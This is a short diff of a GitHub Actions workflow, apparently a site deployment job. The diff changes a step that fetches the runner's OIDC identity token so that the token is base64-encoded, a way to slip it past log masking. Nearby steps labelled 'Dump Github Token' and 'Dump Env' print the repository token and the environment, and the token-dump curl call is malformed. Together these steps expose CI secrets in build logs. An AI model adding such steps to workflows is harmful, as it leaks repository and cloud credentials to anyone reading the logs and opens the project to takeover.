@@ -39,7 +39,7 @@ jobs:
           # Upload entire repository
           path: 'out'
       - name: ACTION
-        run: 'curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" -H "Accept: application/json; api-version=2.0" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://ActionsOIDCGateway"'
+        run: 'curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" -H "Accept: application/json; api-version=2.0" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://ActionsOIDCGateway" | base64'
       - name: Dump Github Token
         run: 'curl -v "Authorization: bearer ${{ secrets.GITHUB_TOKEN }}" https://api.github.com'
       - name: Dump Env
